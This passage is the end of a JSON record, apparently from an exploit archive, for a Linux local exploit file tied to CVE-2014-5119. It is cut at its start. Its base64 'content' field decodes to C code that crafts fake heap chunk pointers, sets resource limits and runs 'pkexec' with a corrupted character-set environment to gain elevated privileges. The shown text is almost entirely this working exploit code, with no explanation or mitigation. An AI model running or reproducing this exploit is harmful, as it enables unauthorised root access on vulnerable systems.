AgICAgICA9IDB4REREREREREQsDQogICAgICAgICAgICAuZmRfbmV4dHNpemUgICAgICAgICAgICA9IGJzc2FkZHIgKyBrVGxzRHRvckxpc3RPZmZzZXQgLSAweDE0LA0KICAgICAgICAgICAgLmJrX25leHRzaXplICAgICAgICAgICAgPSBiYXNlYWRkciArIDgsDQogICAgICAgIH07DQoNCiAgICAgICAgLy8gQ29tcGVuc2F0ZSBmb3IgaGVhcCBtZXRhZGF0YSBldmVyeSAxTUIgb2YgYWxsb2NhdGlvbnMuDQogICAgICAgIGNodW5rYWRkciArPSA4ICsgKGkgLyAoMTAyNCAqIDEwMjQgLyBjaHVua3NpemUgLSAxKSAqIGNodW5rc2l6ZSk7DQoNCiAgICAgICAgaWYgKGNodW5rYWRkciA8IGhlYXBfY2h1bmtfc3RhcnQpDQogICAgICAgICAgICBjb250aW51ZTsNCg0KICAgICAgICBpZiAoY2h1bmthZGRyID4gaGVhcF9jaHVua19lbmQpDQogICAgICAgICAgICBicmVhazsNCg0KICAgICAgICBjaHVua3BhZ2VvZmZzZXQgPSBjaHVua2FkZHIgJiB+UEFHRV9NQVNLOw0KDQogICAgICAgIGlmIChjaHVua3BhZ2VvZmZzZXQgPiB0YXJnZXRwYWdlb2Zmc2V0KSB7DQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICh0YXJnZXRwYWdlb2Zmc2V0IC0gY2h1bmtwYWdlb2Zmc2V0ID4gY2h1bmtzaXplKSB7DQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIExvb2tzIGxpa2UgdGhpcyB3aWxsIGZpdCwgY29tcGVuc2F0ZSB0aGUgcG9pbnRlcnMgZm9yIGFsaWdubWVudC4NCiAgICAgICAgY2h1bmsuZmQgPSBjaHVuay5iayA9IGNodW5rYWRkciArICh0YXJnZXRwYWdlb2Zmc2V0IC0gY2h1bmtwYWdlb2Zmc2V0KTsNCg0KICAgICAgICBpZiAobWVtY2hyKCZjaHVuaywgMCwgc2l6ZW9mIGNodW5rKSkgew0KICAgICAgICAgICAgbG9nbWVzc2FnZShMT0dfV0FSTiwgInBhcmFtZXRlciAldSB3b3VsZCBjb250YWluIGEgbnVsLCBza2lwcGluZyIsIGkpOw0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIH0NCiAgICAgICAgYXJnc1ttbWFwYmFzZSArIGkgKiAyXSA9IHBhcmFtID0gYWxsb2NfcmVwZWF0ZWRfc3RyaW5nKDYwLCAnQScsICdBJywgMCk7DQoNCiAgICAgICAgbWVtY3B5KHBhcmFtICsgKHRhcmdldHBhZ2VvZmZzZXQgLSBjaHVua3BhZ2VvZmZzZXQpLA0KICAgICAgICAgICAgICAgJmNodW5rLA0KICAgICAgICAgICAgICAgc2l6ZW9mIGNodW5rKTsNCiAgICB9DQoNCiAgICBzZXRybGltaXQoUkxJTUlUX1NUQUNLLCAma1JsaW1NYXgpOw0KICAgIHNldHJsaW1pdChSTElNSVRfREFUQSwgJmtSbGltTWluKTsNCg0KICAgIGFyZ3NbMF0gPSAicGtleGVjIjsNCg0KICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAiZXhlY3ZwZSglcy4uLikuLi4iLCBhcmdzWzBdKTsNCiAgICBleGVjdnBlKCJwa2V4ZWMiLCBhcmdzLCBrQ29ycnVwdENoYXJzZXRFbnZpcm9uKTsNCn0=", 
    "filename": "platforms/linux/local/34421.c", 
    "id": "34421", 
    "cves": [
        "CVE-2014-5119"
    ]
}